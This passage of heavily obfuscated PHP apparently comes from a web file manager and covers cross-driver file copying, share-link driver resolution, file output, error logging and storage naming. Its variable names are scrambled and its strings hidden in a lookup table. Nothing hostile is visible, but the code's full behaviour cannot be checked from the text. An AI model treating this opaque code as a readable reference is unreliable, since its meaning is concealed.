$©­³ãµÛ[230]; $¤ã¸­îı = $À¹»À°³->getPathInner($ó½ÔËÕº[$©­³ãµÛ[87]]); $£ºİ©Ñì = self::copyPath($À¹»À°³, $¤ã¸­îı, $ç¹ˆœÆ, $ÏÛ™¯ÒÜ, $€º—Šò³, $¥« ‡ªÉ, $Àã©»ß¼, !1, !1); if (!$£ºİ©Ñì) { IO::errorTips($©­³ãµÛ[1294] . $¤ã¸­îı . $©­³ãµÛ[73] . $ÏÛ™¯ÒÜ); } } self::copyMoveKeepInfo($À¹»À°³, $¤ã¸­îı, $õî£¼’î); return $õî£¼’î; } private static function copyFile($Â¡Œõ, $ŒŞ¦ßœ†, $÷Û¦ùÍ¥, $ÛâÇ™ÍÆ, $¹úÔ ú², $÷üù’æ‰) { $Äğ¿õõï =& $_SERVER[”øäÃÍª]; $ÛâÇ™ÍÆ = $÷Û¦ùÍ¥->getPath(rtrim($ÛâÇ™ÍÆ, $Äğ¿õõï[8]) . $Äğ¿õõï[8] . $¹úÔ ú²); $¶œØÅÄ§ = $Äğ¿õõï[1295] . time() . rand_string(5); Hook::trigger($Äğ¿õõï[1296], $Â¡Œõ, $ŒŞ¦ßœ†, $÷Û¦ùÍ¥, $ÛâÇ™ÍÆ, $¹úÔ ú², $¶œØÅÄ§); if (self::driverIsSame($Â¡Œõ, $÷Û¦ùÍ¥)) { if ($÷üù’æ‰) { $³’Ââ‚ = $÷Û¦ùÍ¥->moveFile($ŒŞ¦ßœ†, $ÛâÇ™ÍÆ); } else { $³’Ââ‚ = $÷Û¦ùÍ¥->copyFile($ŒŞ¦ßœ†, $ÛâÇ™ÍÆ); } Hook::trigger($Äğ¿õõï[1297], $Â¡Œõ, $ŒŞ¦ßœ†, $÷Û¦ùÍ¥, $ÛâÇ™ÍÆ, $¹úÔ ú², $³’Ââ‚); self::copyMoveKeepInfo($Â¡Œõ, $ŒŞ¦ßœ†, $³’Ââ‚); return $³’Ââ‚; } $ïÕÉ×ßù = TEMP_FILES; if ($GLOBALS[$Äğ¿õõï[6]][$Äğ¿õõï[92]][$Äğ¿õõï[909]]) { $ïÕÉ×ßù = $GLOBALS[$Äğ¿õõï[6]][$Äğ¿õõï[92]][$Äğ¿õõï[909]]; } $ÒÆ¼ö— = $ïÕÉ×ßù; mk_dir($ÒÆ¼ö—); $íÉù‹Ï = $ÒÆ¼ö— . $¶œØÅÄ§; $¥¤ªö»¥ = $íÉù‹Ï; $íÉù‹Ï = $Â¡Œõ->download($ŒŞ¦ßœ†, $íÉù‹Ï); $íÉù‹Ï = $Â¡Œõ->iconvApp($íÉù‹Ï); if (substr($íÉù‹Ï, strlen($ïÕÉ×ßù)) == $ïÕÉ×ßù) { $÷üù’æ‰ = !0; } $³’Ââ‚ = $÷Û¦ùÍ¥->upload($ÛâÇ™ÍÆ, $íÉù‹Ï, $÷üù’æ‰); self::remove($¥¤ªö»¥); Hook::trigger($Äğ¿õõï[1297], $Â¡Œõ, $ŒŞ¦ßœ†, $÷Û¦ùÍ¥, $ÛâÇ™ÍÆ, $¹úÔ ú², $³’Ââ‚); self::copyMoveKeepInfo($Â¡Œõ, $ŒŞ¦ßœ†, $³’Ââ‚); return $³’Ââ‚; } private static function copyMoveKeepInfo($Ô¼øñĞì, $˜£÷¢Åà, $à¡•åÎı) { if (!$à¡•åÎı) { return; } $·ŠÑ×³Ü = $Ô¼øñĞì->info($˜£÷¢Åà); if (!is_array($·ŠÑ×³Ü)) { return; } IO::setModifyTime($à¡•åÎı, $·ŠÑ×³Ü[$_SERVER[”øäÃÍª][88]]); } public static function pathFather($Óö¹Å«) { $ùŸãŒ”Ø = IO::init($Óö¹Å«); $Ô“ëàÍë = $ùŸãŒ”Ø->pathFather($ùŸãŒ”Ø->path); return $ùŸãŒ”Ø->getPathOuter($Ô“ëàÍë); } public static function fileOut($Åûˆ†ò, $ÁéÉÉÓİ = false, $í¿ÒóÆ = false, $îæ•¦šÛ = '') { $ìŞëí€ = self::driverMake($Åûˆ†ò); if ($ìŞëí€->isFileOutServer()) { return $ìŞëí€->fileOutServer($Åûˆ†ò, $ÁéÉÉÓİ, $í¿ÒóÆ, $îæ•¦šÛ); } return $ìŞëí€->fileOut($Åûˆ†ò, $ÁéÉÉÓİ, $í¿ÒóÆ, $îæ•¦šÛ); } public static function fileOutImage($³šøõ©, $À±í´¹Ï = 250) { $å½‘€æ¦ = array(250, 600, 1200, 2000, 3000, 5000); for ($‹ˆĞ°ëŠ = 0; $‹ˆĞ°ëŠ < count($å½‘€æ¦); $‹ˆĞ°ëŠ++) { if ($‹ˆĞ°ëŠ == 0 && $À±í´¹Ï <= $å½‘€æ¦[$‹ˆĞ°ëŠ]) { $À±í´¹Ï = $å½‘€æ¦[$‹ˆĞ°ëŠ]; break; } else { if ($À±í´¹Ï > $å½‘€æ¦[$‹ˆĞ°ëŠ - 1] && $À±í´¹Ï <= $å½‘€æ¦[$‹ˆĞ°ëŠ]) { $À±í´¹Ï = $å½‘€æ¦[$‹ˆĞ°ëŠ]; break; } else { if ($‹ˆĞ°ëŠ == count($å½‘€æ¦) - 1 && $À±í´¹Ï > $å½‘€æ¦[$‹ˆĞ°ëŠ]) { $À±í´¹Ï = $å½‘€æ¦[$‹ˆĞ°ëŠ]; break; } } } } $È˜§¤Ê´ = self::driverMake($³šøõ©); if ($È˜§¤Ê´->isFileOutServer()) { return $È˜§¤Ê´->fileOutImageServer($³šøõ©, $À±í´¹Ï); } return $È˜§¤Ê´->fileOutImage($³šøõ©, $À±í´¹Ï); } private static function driverIsSame($˜êÌç˜‚, $ò©¢òÔÂ) { $íƒˆÕÃô =& $_SERVER[”øäÃÍª]; $ÄÌºùÜ“ = $˜êÌç˜‚->getType(); $£ñ´³î¥ = $ò©¢òÔÂ->getType(); if ($ÄÌºùÜ“ != $£ñ´³î¥) { return !1; } if ($ÄÌºùÜ“ == $íƒˆÕÃô[867]) { return !0; } if ($ÄÌºùÜ“ == $íƒˆÕÃô[106]) { return !0; } if ($˜êÌç˜‚->pathDriver == $ò©¢òÔÂ->pathDriver) { return !0; } return !1; } public static function copyUpdate($Îôš¤ç, $á¢ÒÎÁŒ) { $üƒÅ„ =& $_SERVER[”øäÃÍª]; if (!IO::exist($Îôš¤ç)) { return !1; } if (!IO::exist($á¢ÒÎÁŒ)) { IO::mkdir($á¢ÒÎÁŒ); } $ğÚÃßñµ = array_to_keyvalue(self::listAllSimple($Îôš¤ç), $üƒÅ„[87]); $ÔÉ¢‰«Ÿ = array_to_keyvalue(self::listAllSimple($á¢ÒÎÁŒ), $üƒÅ„[87]); $¾§Õğ…º = array(); $¥¬Â†Ê = array(); foreach ($ğÚÃßñµ as $óğğ©Ù• => $ÖŸŸóÜˆ) { if (isset($ÔÉ¢‰«Ÿ[$óğğ©Ù•])) { if ($ÖŸŸóÜˆ[$üƒÅ„[78]] == 1) { continue; } if ($ÔÉ¢‰«Ÿ[$óğğ©Ù•][$üƒÅ„[79]] == $ÖŸŸóÜˆ[$üƒÅ„[79]]) { continue; } } if ($ÖŸŸóÜˆ[$üƒÅ„[78]] == 1) { $¥¬Â†Ê[] = $á¢ÒÎÁŒ . $üƒÅ„[8] . trim($óğğ©Ù•, $üƒÅ„[8]); continue; } $Í«™º‚É = strstr(trim($óğğ©Ù•, $üƒÅ„[8]), $üƒÅ„[8]) ? get_path_father($óğğ©Ù•) : $üƒÅ„[12]; $¾§Õğ…º[] = array($üƒÅ„[1298] => $ÖŸŸóÜˆ[$üƒÅ„[89]], $üƒÅ„[1299] => rtrim($á¢ÒÎÁŒ, $üƒÅ„[8]) . $üƒÅ„[8] . $Í«™º‚É, $üƒÅ„[1300] => $ÖŸŸóÜˆ); } $Òå³ïÜ¯ = array($üƒÅ„[230] => $¾§Õğ…º, $üƒÅ„[78] => $¥¬Â†Ê); Hook::trigger($üƒÅ„[1301], $Îôš¤ç, $á¢ÒÎÁŒ, $Òå³ïÜ¯); foreach ($¥¬Â†Ê as $ÖŸŸóÜˆ) { IO::mkdir($ÖŸŸóÜˆ); } foreach ($¾§Õğ…º as $ÖŸŸóÜˆ) { IO::copy($ÖŸŸóÜˆ[$üƒÅ„[1298]], $ÖŸŸóÜˆ[$üƒÅ„[1299]], REPEAT_REPLACE); } } public static function fileSubstr($ ”²Ï§, $Š”Õ‹÷˜, $ãÛñÈÂ = false) { $î£Í’°± =& $_SERVER[”øäÃÍª]; $±­¶ÏÔå = self::driverMake($ ”²Ï§); $Å´‘Éì = $±­¶ÏÔå->size($ ”²Ï§); $¯·ÙÍæ– = $Š”Õ‹÷˜; $Ÿ¾»ñ¹í = $ãÛñÈÂ; if ($Š”Õ‹÷˜ < 0) { $Š”Õ‹÷˜ = $Å´‘Éì + $Š”Õ‹÷˜; } if ($ãÛñÈÂ === !1) { $ãÛñÈÂ = $Å´‘Éì - $Š”Õ‹÷˜; } if ($Š”Õ‹÷˜ + $ãÛñÈÂ > $Å´‘Éì) { $ãÛñÈÂ = $Å´‘Éì - $Š”Õ‹÷˜; } if (!$Å´‘Éì && $±­¶ÏÔå->getType() == $î£Í’°±[106] && !$±­¶ÏÔå->exist($ ”²Ï§)) { $ó´Á¨Ñ = get_path_this($ ”²Ï§); $¸°µèÔ… = parse_url_query($ó´Á¨Ñ); if (is_array($¸°µèÔ…) && isset($¸°µèÔ…[$î£Í’°±[32]])) { $ó´Á¨Ñ = urldecode($¸°µèÔ…[$î£Í’°±[32]]); } throw new Exception($î£Í’°±[1302] . LNG($î£Í’°±[1303]) . $î£Í’°±[1088] . clear_html($ó´Á¨Ñ) . $î£Í’°±[12]); } if ($ãÛñÈÂ <= 0) { return $î£Í’°±[12]; } if ($Š”Õ‹÷˜ < 0 || $Š”Õ‹÷˜ >= $Å´‘Éì || $ãÛñÈÂ > $GLOBALS[$î£Í’°±[6]][$î£Í’°±[92]][$î£Í’°±[1304]]) { throw new Exception("\x66\x69\x6c\x65\x52\145\141\x64\40\x65\x72\x72\x6f\x72\x2c\157\x76\145\162\x20\151\157\x52\x65\x61\144\x4d\x61\x78\41\40\x73\164\141\162\164\x3d{$Š”Õ‹÷˜}\x3b\x6c\x65\156\x67\164\x68\75{$ãÛñÈÂ}\73\x20\163\x69\x7a\x65\75{$Å´‘Éì}\x3b"); } $ë¶¬Ñ½ô = $±­¶ÏÔå->fileSubstr($ ”²Ï§, $Š”Õ‹÷˜, $ãÛñÈÂ); if (!$ë¶¬Ñ½ô && $ãÛñÈÂ && isset($GLOBALS[$î£Í’°±[1305]])) { throw new Exception($GLOBALS[$î£Í’°±[1305]][$î£Í’°±[1306]]); } return $ë¶¬Ñ½ô; } private static function driverMake(&$±§¿×´õ) { $ÑÕÅá•Ê =& $_SERVER[”øäÃÍª]; $Ê‰¾†ë = KodIO::parse($±§¿×´õ); if (!self::$driverListSystem) { $×¯Ìœ½Û = Model($ÑÕÅá•Ê[877])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($×¯Ìœ½Û, $ÑÕÅá•Ê[487]); } if ($Ê‰¾†ë[$ÑÕÅá•Ê[33]] == KodIO::KOD_IO && !self::$driverListSystem[$Ê‰¾†ë[$ÑÕÅá•Ê[487]]]) { throw new Exception($ÑÕÅá•Ê[1307]); return !1; } $±§¿×´õ = $Ê‰¾†ë[$ÑÕÅá•Ê[1308]]; $şŠõ® = self::driverGet($Ê‰¾†ë, $±§¿×´õ); return $şŠõ®; } private static function driverGet($°¤ıÊò‹, &$ø×èƒä) { $¶ğßìëŸ =& $_SERVER[”øäÃÍª]; $³½•ñœŸ = $°¤ıÊò‹[$¶ğßìëŸ[1309]]; $Òº¤É¤· = $°¤ıÊò‹[$¶ğßìëŸ[487]]; switch ($°¤ıÊò‹[$¶ğßìëŸ[33]]) { case KodIO::KOD_IO: $±ƒ÷Öà“ = self::$driverListSystem[$Òº¤É¤·]; break; case KodIO::KOD_SOURCE: $ø×èƒä = $Òº¤É¤· . $ø×èƒä; $±ƒ÷Öà“ = array($¶ğßìëŸ[1310] => $¶ğßìëŸ[1311], $¶ğßìëŸ[6] => $°¤ıÊò‹); $±ƒ÷Öà“[$¶ğßìëŸ[6]][$¶ğßìëŸ[1312]] = $°¤ıÊò‹[$¶ğßìëŸ[487]]; break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $ê³âÁÜ† = $GLOBALS[$¶ğßìëŸ[1313]]; self::$driverListUser = array_to_keyvalue($ê³âÁÜ†, $¶ğßìëŸ[487]); } $±ƒ÷Öà“ = self::$driverListUser[$Òº¤É¤·]; break; case KodIO::KOD_SHARE_LINK: $±ƒ÷Öà“ = array($¶ğßìëŸ[1310] => $¶ğßìëŸ[1314], $¶ğßìëŸ[6] => $°¤ıÊò‹); $ ‘·¨”« = Action($¶ğßìëŸ[1315])->sharePathInfo($°¤ıÊò‹[$¶ğßìëŸ[87]]); $ø×èƒä = $ ‘·¨”«[$¶ğßìëŸ[191]]; if (!$ ‘·¨”«[$¶ğßìëŸ[191]]) { $ÁŠ¾„¶Ø = Model($¶ğßìëŸ[694])->getInfoByHash($°¤ıÊò‹[$¶ğßìëŸ[487]]); $ø×èƒä = KodIO::clear($ÁŠ¾„¶Ø[$¶ğßìëŸ[591]] . $°¤ıÊò‹[$¶ğßìëŸ[1308]]); $°¤ıÊò‹[$¶ğßìëŸ[584]] = $ÁŠ¾„¶Ø; $°¤ıÊò‹[$¶ğßìëŸ[1289]] = $ø×èƒä; $±ƒ÷Öà“ = array($¶ğßìëŸ[1310] => $¶ğßìëŸ[1316], $¶ğßìëŸ[6] => $°¤ıÊò‹); } else { $±ƒ÷Öà“[$¶ğßìëŸ[6]][$¶ğßìëŸ[1312]] = $ ‘·¨”«[$¶ğßìëŸ[191]]; } break; case KodIO::KOD_SHARE_ITEM: $±ƒ÷Öà“ = array($¶ğßìëŸ[1310] => $¶ğßìëŸ[1317], $¶ğßìëŸ[6] => $°¤ıÊò‹); $ÁŠ¾„¶Ø = Model($¶ğßìëŸ[694])->getInfo($°¤ıÊò‹[$¶ğßìëŸ[487]]); if ($ÁŠ¾„¶Ø[$¶ğßìëŸ[191]] == $¶ğßìëŸ[228]) { $ø×èƒä = KodIO::clear($ÁŠ¾„¶Ø[$¶ğßìëŸ[591]] . $°¤ıÊò‹[$¶ğßìëŸ[1308]]); $°¤ıÊò‹[$¶ğßìëŸ[584]] = $ÁŠ¾„¶Ø; $°¤ıÊò‹[$¶ğßìëŸ[1289]] = $ø×èƒä; $±ƒ÷Öà“ = array($¶ğßìëŸ[1310] => $¶ğßìëŸ[1318], $¶ğßìëŸ[6] => $°¤ıÊò‹); } else { if (!$ø×èƒä) { $ø×èƒä = $ÁŠ¾„¶Ø[$¶ğßìëŸ[191]]; } $±ƒ÷Öà“[$¶ğßìëŸ[6]][$¶ğßìëŸ[1312]] = $ÁŠ¾„¶Ø[$¶ğßìëŸ[191]]; } break; case KodIO::KOD_SHARE_OUTER: $±ƒ÷Öà“ = array($¶ğßìëŸ[1310] => $¶ğßìëŸ[1319], $¶ğßìëŸ[6] => $°¤ıÊò‹); break; default: $ø×èƒä = $°¤ıÊò‹[$¶ğßìëŸ[87]]; $±ƒ÷Öà“ = array($¶ğßìëŸ[1310] => $¶ğßìëŸ[1320]); break; } $õö•øÄÉ = $°¤ıÊò‹[$¶ğßìëŸ[87]]; if (!isset(self::$driverCache[$õö•øÄÉ])) { $›äÎÀŞ = strtolower($±ƒ÷Öà“[$¶ğßìëŸ[96]]); $³’Æõå = $GLOBALS[$¶ğßìëŸ[6]][$¶ğßìëŸ[92]][$¶ğßìëŸ[942]]; $¯ìƒú« = $¶ğßìëŸ[77] . (isset($³’Æõå[$›äÎÀŞ]) ? $³’Æõå[$›äÎÀŞ] : ucfirst($›äÎÀŞ)); if (!class_exists($¯ìƒú«)) { show_json("{$¯ìƒú«}\x20\156\157\x74\x20\x65\x78\x69\x73\x74\x73\x21", !1); } $Ò—ßŞÍ = isset($±ƒ÷Öà“[$¶ğßìëŸ[6]]) ? $±ƒ÷Öà“[$¶ğßìëŸ[6]] : !1; self::$driverCache[$õö•øÄÉ] = new $¯ìƒú«($Ò—ßŞÍ); } $€‚¥¿üã = self::$driverCache[$õö•øÄÉ]; $€‚¥¿üã->pathDriver = $³½•ñœŸ; $€‚¥¿üã->pathBase = $¶ğßìëŸ[12]; if (isset($±ƒ÷Öà“[$¶ğßìëŸ[6]][$¶ğßìëŸ[1321]])) { $€‚¥¿üã->pathBase = rtrim($±ƒ÷Öà“[$¶ğßìëŸ[6]][$¶ğßìëŸ[1321]], $¶ğßìëŸ[8]) . $¶ğßìëŸ[8]; $ø×èƒä = $€‚¥¿üã->pathBase . ltrim($ø×èƒä, $¶ğßìëŸ[8]); } $ø×èƒä = $€‚¥¿üã->getPath($ø×èƒä); if (isset($°¤ıÊò‹[$¶ğßìëŸ[1289]])) { $ø×èƒä = $°¤ıÊò‹[$¶ğßìëŸ[1289]]; } $€‚¥¿üã->path = $ø×èƒä; return $€‚¥¿üã; } public static function errorTips($©èÔÀ¡” = false, $ĞóÑàÊ = true) { $Ü‹Œ†±· =& $_SERVER[”øäÃÍª]; static $©ÄéƒÈ¨ = array(); $™ŒÁ‚Ù = 100; if ($©èÔÀ¡” === -1) { return $©ÄéƒÈ¨ ? $©ÄéƒÈ¨[count($©ÄéƒÈ¨) - 1] : $Ü‹Œ†±·[12]; } if ($©èÔÀ¡” === !1) { return implode($Ü‹Œ†±·[285], $©ÄéƒÈ¨); } if (count($©ÄéƒÈ¨) >= $™ŒÁ‚Ù) { $©ÄéƒÈ¨ = array_slice($©ÄéƒÈ¨, $™ŒÁ‚Ù * 0.5, $™ŒÁ‚Ù); } $©ÄéƒÈ¨[] = $©èÔÀ¡”; if (!$ĞóÑàÊ) { return; } write_log($Ü‹Œ†±·[173] . ACTION . $Ü‹Œ†±·[1322] . $©èÔÀ¡”, $Ü‹Œ†±·[1323]); } public static function getLastError($¡¿¶ˆ­Ï = '') { $öØÉ¯ ‚ = self::errorTips(-1); return $öØÉ¯ ‚ ? $öØÉ¯ ‚ : $¡¿¶ˆ­Ï; } } goto dÔÅğì ; CùÍ»İ¾Ò¸: class FileContentModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\146\x69\x6c\145\137\143\x6f\156\164\x65\156\x74\163"; protected $dataAuto = array(array("\x63\162\x65\141\164\x65\x54\151\x6d\x65", "\164\x69\x6d\x65", "\151\x6e\163\145\162\x74", "\x66\165\156\143\164\x69\x6f\x6e")); } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\137\146\151\x6c\x65"; protected $tableMeta = array("\x74\141\x62\154\x65\x4e\141\x6d\145" => "\x69\157\x5f\146\x69\154\145\137\155\x65\164\x61", "\155\145\164\141\106\151\x65\154\x64" => "\146\x69\x6c\x65\x49\x44"); public function fileInfo($öŠ©ÑÇ‚) { $ÚÕòìü¼ =& $_SERVER[”øäÃÍª]; static $ËÁÙüæõ = array(); if (!isset($ËÁÙüæõ[$öŠ©ÑÇ‚])) { $Çï–´ğÆ = $ÚÕòìü¼[2189]; $ŞÆÈ€¤Ê = Model($ÚÕòìü¼[568])->field($Çï–´ğÆ)->where(array($ÚÕòìü¼[566] => $öŠ©ÑÇ‚))->find(); $ËÁÙüæõ[$öŠ©ÑÇ‚] = $ŞÆÈ€¤Ê; } return $ËÁÙüæõ[$öŠ©ÑÇ‚]; } public function addFileByContent($ìÄÂ«Î = '', $Ÿæı¯½®, $‘úÁ¡Í¯ = '') { $ıòÇ—…Š =& $_SERVER[”øäÃÍª]; $ÆŠ™´Ëñ = TEMP_PATH . $ıòÇ—…Š[2190]; if (!is_dir($ÆŠ™´Ëñ)) { mk_dir($ÆŠ™´Ëñ); } $¶œûİ¨÷ = $ÆŠ™´Ëñ . $ıòÇ—…Š[2191] . rand_string(16); $®–Ñ·Í = file_put_contents($¶œûİ¨÷, $ìÄÂ«Î); if ($®–Ñ·Í === !1 || strlen($ìÄÂ«Î) != $®–Ñ·Í) { return !1; } $å³Ì¦™Î = $this->addFile($¶œûİ¨÷, $Ÿæı¯½®, $‘úÁ¡Í¯, !0); if (file_exists($¶œûİ¨÷)) { @unlink($¶œûİ¨÷); } return $å³Ì¦™Î; } public function createFileName($ğŸ£Úùˆ, $›Ó–ó§…, $©“ˆÜ§ = false, $üÜó˜â = false) { $ÔÈõğî =& $_SERVER[”øäÃÍª]; $Â×¿Ä¨ = IO::init($ÔÈõğî[8]); $Ô‹˜ûÀ§ = $this->_makeFilePath($ğŸ£Úùˆ, $›Ó–ó§…, $Â×¿Ä¨, $©“ˆÜ§, $üÜó˜â); $éô°İµ = $Â×¿Ä¨->pathFather($Ô‹˜ûÀ§); static $ÊÇÙˆöİ = false; $‚Ò÷³Ùğ = $ÔÈõğî[2192] . md5($éô°İµ); if (!$ÊÇÙˆöİ && !Cache::get($‚Ò÷³Ùğ)) { $ÊÇÙˆöİ = !0; $Š©ÛÉëÊ = IO::mkdir($éô°İµ); if (!IO::exist($Š©ÛÉëÊ . $ÔÈõğî[910])) { IO::mkfile($Š©ÛÉëÊ . $ÔÈõğî[910]); } Cache::set($‚Ò÷³Ùğ, 1, 3600 * 2); } return $Ô‹˜ûÀ§; } public function _makeFilePath($ì³£Á×, $…÷çúÔÓ, $‚ƒ˜ü“§, $ÄÒÔìïÁ = false, $©Ÿ¤üòæ = false) { $¦Çœ†‡• =& $_SERVER[”øäÃÍª]; $ÜæÇÒµ = Model($¦Çœ†‡•[882])->get($¦Çœ†‡•[2193]); $«Â›©Œ = $¦Çœ†‡•[1380] . $…÷çúÔÓ[$¦Çœ†‡•[487]] . $¦Çœ†‡•[507] . date($¦Çœ†‡•[2194]); $³¢Ôş¥º = $«Â›©Œ . rand_string(5) . short_id(100); $ì³£Á× = str_replace($¦Çœ†‡•[8], $¦Çœ†‡•[11], KodIO::clear($ì³£Á×)); $ˆ¥‡î = $‚ƒ˜ü“§->ext($ì³£Á×); if (!$ì³£Á×) { $ÜæÇÒµ = $¦Çœ†‡•[888]; } switch ($ÜæÇÒµ) { case $¦Çœ†‡•[2195]: if ($ˆ¥‡î) { $³¢Ôş¥º = $³¢Ôş¥º . $¦Çœ†‡•[10] . $ˆ¥‡î; } if ($ˆ¥‡î == $¦Çœ†‡•[2133]) { $³¢Ôş¥º .= $¦Çœ†‡•[1349]; } break; case $¦Çœ†‡•[2196]: $·ä´©Š = Model($¦Çœ†‡•[882])->get($¦Çœ†‡•[883]); $¹Ïğ‹ = substr(md5($¦Çœ†‡•[884] . $·ä´©Š . date($¦Çœ†‡•[858])), 0, 8); $«Â›©Œ = $¦Çœ†‡•[1380] . $…÷çúÔÓ[$¦Çœ†‡•[487]] . $¦Çœ†‡•[507] . date($¦Çœ†‡•[2197]) . $¹Ïğ‹ . $¦Çœ†‡•[8]; if ($ˆ¥‡î == $¦Çœ†‡•[2133]) { $ì³£Á× .= $¦Çœ†‡•[1349]; } $•êªÇ = $¦Çœ†‡•[2198] . $«Â›©Œ . $ì³£Á×; CacheLock::lock($•êªÇ); $³¢Ôş¥º = $«Â›©Œ . $ì³£Á×; if (IO::exist($«Â›©Œ . $ì³£Á×)) { $óŞşşï¨ = substr($ì³£Á×, 0, strlen($ì³£Á×) - strlen($ˆ¥‡î)); $áÖúƒÙ× = $©Ÿ¤üòæ ? substr($©Ÿ¤üòæ, 0, 5) : ($ÄÒÔìïÁ ? substr($ÄÒÔìïÁ, 0, 5) : rand_string(5)); $áÖúƒÙ× .= rand_string(3); $³¢Ôş¥º = $«Â›©Œ . $óŞşşï¨ . $áÖúƒÙ×; if ($ˆ¥‡î) { $³¢Ôş¥º = $³¢Ôş¥º . $¦Çœ†‡•[10] . $ˆ¥‡î; } } if (IO::isOsDriver($³¢Ôş¥º) && !IO::isUploadServer($³¢Ôş¥º)) { if (IO::exist($³¢Ôş¥º)) { CacheLock::unlock($•êªÇ); return $³¢Ôş¥º; } $û¬ñôí = IO::setContent($³¢Ôş¥º, $¦Çœ†‡•[12]); if (!$û¬ñôí) { show_json($¦Çœ†‡•[2199], !1); } } CacheLock::unlock($•êªÇ); break; case $¦Çœ†‡•[888]: break; default: break; } return $³¢Ôş¥º; } public function addFileByRemote($İ¦Ú³»£, $¤×¿ë·÷, $­ÍáîãÏ = array()) { $Ö‹šşâà =& $_SERVER[”øäÃÍª]; if (!IO::isFile($İ¦Ú³»£)) { return !1; } $åóÔóàƒ = $­ÍáîãÏ[$Ö‹šşâà[571]] ? $­ÍáîãÏ[$Ö‹šşâà[571]] : $Ö‹šşâà[12]; $èÆÅ§Óı = IO::hashMd5($İ¦Ú³»£, $åóÔóàƒ); $±í‡ã¹³ = KodIO::parse($İ¦Ú³»£); $——ã”Œú = array($Ö‹šşâà[648] => IO::size($İ¦Ú³»£), $Ö‹šşâà[2200] => 1, $Ö‹šşâà[517] => $¤×¿ë·÷, $Ö‹šşâà[924] => $±í‡ã¹³[$Ö‹šşâà[487]], $Ö‹šşâà[518] => $İ¦Ú³»£, $Ö‹šşâà[2201] => $­ÍáîãÏ[$Ö‹šşâà[702]] ? $­ÍáîãÏ[$Ö‹šşâà[702]] : IO::hashSimple($İ¦Ú³»£), $Ö‹šşâà[2202] => $èÆÅ§Óı ? $èÆÅ§Óı : $åóÔóàƒ); if ($„¹Íì™‹ = $this->addFileCheckExist($——ã”Œú[$Ö‹šşâà[702]], $——ã”Œú[$Ö‹šşâà[571]], $——ã”Œú[$Ö‹šşâà[79]])) { return $„¹Íì™‹; } return $this->addFileData($——ã”Œú); } private function addFileData($Ø®°‚€é) { $¦åû‘…© =& $_SERVER[”øäÃÍª]; if (!$Ø®°‚€é) { return !1; } if (!IO::isFile($Ø®°‚€é[$¦åû‘…©[87]])) { return !1; } $Ø®°‚€é[$¦åû‘…©[79]] = intval($Ø®°‚€é[$¦åû‘…©[79]]); if (!$Ø®°‚€é[$¦åû‘…©[79]] && strlen($Ø®°‚€é[$¦åû‘…©[702]]) > 32) { $Ø®°‚€é[$¦åû‘…©[79]] = intval(substr($Ø®°‚€é[$¦åû‘…©[702]], 32)); } $¢Ãøóô¡ = $this->add($Ø®°‚€é); return $this->find($¢Ãøóô¡); } public function addFile($–„–îö, $ÃŸß´©ö, $Å¸å©Œó, $‚°§§„à = false) { $ÂÙ†ù =& $_SERVER[”øäÃÍª]; $Ìæàˆ¦å = IO::hashSimple($–„–îö); $ª¬á¯ = IO::size($–„–îö); $ŒëüËÙ¶ = $ª¬á¯ <= 1024 * 1024 * 10 ? IO::hashMd5($–„–îö) : $ÂÙ†ù[12]; $‹Æ£·ÕŒ = $ÂÙ†ù[2203] . $Ìæàˆ¦å; CacheLock::lock($‹Æ£·ÕŒ); if ($ŒëüËÙ¶ && $Ìæàˆ¦å) { $€¶£Ïµ¡ = $this->addFileCheckExist($Ìæàˆ¦å, $ŒëüËÙ¶, $ª¬á¯); if ($€¶£Ïµ¡) { CacheLock::unlock($‹Æ£·ÕŒ); return $€¶£Ïµ¡; } } $‚œ×è‘ö = $this->addFileMake($–„–îö, $ÃŸß´©ö, $ª¬á¯, $Ìæàˆ¦å, $ŒëüËÙ¶, $Å¸å©Œó, $‚°§§„à); $ìûé¿ á = $this->addFileData($‚œ×è‘ö); if (!$ìûé¿ á) { return !1; } CacheLock::unlock($‹Æ£·ÕŒ); if (!$ŒëüËÙ¶ && $ìûé¿ á) { $this->fileMd5Check($ìûé¿ á); } return $ìûé¿ á; } public function fileMd5Check($Í¿–è¥Œ) { $§ºÑÁºÌ =& $_SERVER[”øäÃÍª]; $ÃéÀ¦³ü = array($Í¿–è¥Œ[$§ºÑÁºÌ[565]], $Í¿–è¥Œ[$§ºÑÁºÌ[87]]); $à¹ÄíçÊ = $§ºÑÁºÌ[2204] . $Í¿–è¥Œ[$§ºÑÁºÌ[87]]; $ĞÎºÏŠ = $§ºÑÁºÌ[2205] . $Í¿–è¥Œ[$§ºÑÁºÌ[565]]; TaskQueue::add($§ºÑÁºÌ[2206], $ÃéÀ¦³ü, $à¹ÄíçÊ, $ĞÎºÏŠ); } public function fileMd5Set($œ‚ù½ˆæ, $òé¯˜Î¥) { $ÚéÇÕ»Ë =& $_SERVER[”øäÃÍª]; $„à€÷¶ş = $this->find($œ‚ù½ˆæ); if (!$„à€÷¶ş || $„à€÷¶ş[$ÚéÇÕ»Ë[571]]) { return; } $˜ô«„øğ = IO::hashMd5($òé¯˜Î¥); if (!$˜ô«„øğ) { return $ÚéÇÕ»Ë[12]; } $this->where(array($ÚéÇÕ»Ë[565] => $œ‚ù½ˆæ))->save(array($ÚéÇÕ»Ë[571] => $˜ô«„øğ)); } public function addFileMake($õŠİÂ·Š, $Ó’†…£È, $„ïéº¦Ø, $”Ã„ğúş, $¼½åéÀÇ, $ÊñÄ±ª², $ŞıŸÆŸ) { $ˆÊœ²¦õ =& $_SERVER[”øäÃÍª]; $ºç¿ã³û = $this->createFileName($ÊñÄ±ª², $Ó’†…£È, $”Ã„ğúş, $¼½åéÀÇ); $‡½ÄùøÄ = get_path_father($ºç¿ã³û); $·À½ú = get_path_this($ºç¿ã³û); if ($ŞıŸÆŸ) { $†²¢šîË = IO::move($õŠİÂ·Š, $‡½ÄùøÄ, !1, $·À½ú); } else { $†²¢šîË = IO::copy($õŠİÂ·Š, $‡½ÄùøÄ, !1, $·À½ú); } if (!$†²¢šîË) { return !1; } $î¾ŞÍÌù = IO::init($†²¢šîË); $î¾ŞÍÌù->cacheMethod($ˆÊœ²¦õ[179], $î¾ŞÍÌù->path, $ˆÊœ²¦õ[176]); if (IO::size($†²¢šîË) != $„ïéº¦Ø) { return !1; } $©¼—²ò‹ = array($ˆÊœ²¦õ[648] => $„ïéº¦Ø, $ˆÊœ²¦õ[2200] => 1, $ˆÊœ²¦õ[517] => $ÊñÄ±ª², 